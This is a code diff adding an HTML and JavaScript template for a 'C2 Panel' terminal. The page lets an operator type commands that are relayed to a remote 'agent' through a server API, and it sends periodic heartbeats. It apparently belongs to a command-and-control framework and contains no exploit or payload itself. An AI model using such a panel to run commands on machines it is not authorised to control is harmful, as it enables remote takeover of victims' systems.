@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>C2 Panel - Terminal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            background: #0a0e17;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid #1a2a3a;
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            color: #00d4ff;
+            font-size: 18px;
+        }
+        .header a {
+            color: #00d4ff;
+            text-decoration: none;
+            padding: 6px 12px;
+            border: 1px solid #00d4ff;
+            border-radius: 4px;
+            font-size: 12px;
+        }
+        .header a:hover {
+            background: #00d4ff;
+            color: #000;
+        }
+        .terminal {
+            flex: 1;
+            background: #000;
+            border: 1px solid #1a2a3a;
+            border-radius: 8px;
+            padding: 20px;
+            overflow-y: auto;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        .terminal .prompt {
+            color: #0f0;
+        }
+        .terminal .output {
+            color: #c8d6e5;
+        }
+        .terminal .error {
+            color: #ff6b6b;
+        }
+        .input-line {
+            display: flex;
+            align-items: center;
+            margin-top: 10px;
+        }
+        .input-line .prompt {
+            color: #0f0;
+            margin-right: 10px;
+        }
+        .input-line input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            outline: none;
+        }
+        .input-line input:focus {
+            outline: none;
+        }
+        .info {
+            color: #8395a7;
+            font-size: 12px;
+            padding: 10px 0;
+        }
+        .agent-id {
+            color: #f9ca24;
+        }
+    </style>
+</head>
+<body>
+<div class="header">
+    <h1>▶ Terminal - Agent <span class="agent-id" id="agentId">{{ agent_id }}</span></h1>
+    <a href="/agents">← Back to Agents</a>
+</div>
+
+<div class="info">
+    Connected to agent ID: <span class="agent-id">{{ agent_id }}</span> | 
+    Type commands to execute | <span style="color: #ff6b6b;">Ctrl+C</span> to cancel
+</div>
+
+<div class="terminal" id="terminal">
+    <div class="output">C2 Terminal v1.0</div>
+    <div class="output">Connected to agent {{ agent_id }}</div>
+    <div class="output">Type 'help' for commands</div>
+    <div class="output">─────────────────────────────</div>
+</div>
+
+<div class="input-line">
+    <span class="prompt">$</span>
+    <input type="text" id="commandInput" placeholder="Enter command..." autofocus>
+</div>
+
+<script>
+    const terminal = document.getElementById('terminal');
+    const input = document.getElementById('commandInput');
+    const agentId = document.getElementById('agentId').textContent;
+
+    function appendOutput(text, type = 'output') {
+        const div = document.createElement('div');
+        div.className = type;
+        div.textContent = text;
+        terminal.appendChild(div);
+        terminal.scrollTop = terminal.scrollHeight;
+    }
+
+    async function sendCommand(command) {
+        if (!command.trim()) return;
+
+        appendOutput(`$ ${command}`, 'prompt');
+
+        try {
+            const response = await fetch(`/api/agent/${agentId}/command`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: command })
+            });
+
+            if (response.ok) {
+                appendOutput('[✓] Command sent to agent', 'output');
+            } else {
+                appendOutput('[✗] Failed to send command', 'error');
+            }
+        } catch (e) {
+            appendOutput(`[✗] Error: ${e.message}`, 'error');
+        }
+    }
+
+    input.addEventListener('keydown', async (e) => {
+        if (e.key === 'Enter') {
+            const command = input.value;
+            input.value = '';
+            await sendCommand(command);
+        }
+    });
+
+    // Focus input on load
+    input.focus();
+
+    // Auto reconnect
+    setInterval(async () => {
+        try {
+            await fetch(`/api/agent/${agentId}/heartbeat`, { method: 'POST' });
+        } catch (e) {
+            // Silent
+        }
+    }, 30000);
+
+    appendOutput('[✓] Terminal ready', 'output');
+</script>
+</body>
+</html>
